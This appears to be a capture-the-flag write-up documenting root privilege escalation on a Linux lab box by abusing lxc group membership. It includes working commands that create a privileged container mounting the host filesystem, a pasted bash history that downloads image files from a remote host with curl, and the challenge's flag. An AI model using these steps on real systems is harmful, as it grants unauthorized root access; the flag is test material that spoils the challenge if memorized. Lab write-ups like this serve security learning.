##### /usr/bin/lxc
- linpeas results showed someone elses privesc
![[Pasted image 20240617151644.png]]
##### In process list
![[Pasted image 20240617152046.png]]
##### Googling lxc 
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
- comes up with a hacktricks link where it shows you the process of privilege escalating with `/usr/bin/lxc` on the box.
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Finally you can execute the container and get root.
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

##### Bash history
- bash history showed someone already abusing the `lxc` binary so I just executed
```bash
curl http://172.16.0.21:8080/incus.tar.xz -o incus.tar.xz                                                                                                                                                   
curl http://172.16.0.21:8080/rootfs.squashfs -o rootfs.squashfs                                                                                                                                             
ls                                                                                                                                                                                                          
lxc image impiort incus.tar.xz rootfs.squashfs --alias alpine                                                                                                                                               
lxd image import incus.tar.xz rootfs.squashfs --alias alpine
ls
distrobuilder
ls
lxc image import incus.tar.xz rootfs.squashfs alias alpine
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true 
lxc list
lxc storage create mypool dir
lxc init alpine privesc -c security.privileged=true
lxd init
lxc init images:alpine/3.12 privesc -c security.privileged=true -s mypool
lxc list
lxc init images:alpine/3.12 privesc -c security.privileged=true -s rootmwe
lxc init images:alpine/3.12 privesc -c security.privileged=true -s rootme
ls
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true -s rootme
lxc start privesc
lxc exec privesc /bin/bash
ls
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc exec privesc /bin/sh
ls
exit
ls -al
cat .bash
cat .bash_history 

```

##### Privilege Escalation
- executed the `lxc` binary as shown on hacktricks and got placed into a container shell
![[Pasted image 20240617152434.png]]
- ran `uname -a` and saw that we are the name of the container
![[Pasted image 20240617152835.png]]
- on the hacktricks page saw that we should be able to mount to root drive
![[Pasted image 20240617152933.png]]
- cd'd to `/mnt/root/root` and pulled the flag
![[Pasted image 20240617153120.png]]
```bash
/mnt/root/root # ^[[44;18Rcat flag.txt
cat flag.txt
ALCHEMY{whA7_HaV3_1_D0N3?_F0R91V3_91V3_l0RD}
```